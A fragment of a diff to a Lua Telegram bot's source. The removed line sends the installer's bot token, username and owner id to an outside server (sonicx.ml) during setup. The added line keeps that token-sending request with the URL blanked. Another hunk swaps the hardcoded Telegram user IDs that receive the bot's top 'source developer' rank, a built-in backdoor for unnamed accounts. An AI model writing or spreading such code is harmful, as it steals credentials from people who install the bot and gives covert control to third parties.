@@ -103,7 +103,7 @@ info.id = SUDO_USER
 info.token = Token
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-https.request('https://sonicx.ml/Sourcedany/Source.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
+https.request('.........'..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
@@ -242,10 +242,10 @@ msg.GroupActive = true
 else
 msg.GroupActive = false
 end
-if msg.sender_user_id_ == 1614375843 then 
+if msg.sender_user_id_ == 1706625415 then 
 msg.TheRank =  'مطور السورس'
 msg.Rank = 1
-elseif msg.sender_user_id_ == 798474922 then 
+elseif msg.sender_user_id_ == 1166711147 then 
 msg.TheRank =  'مطور السورس'
 msg.Rank = 1
 elseif msg.sender_user_id_ == SUDO_ID then 
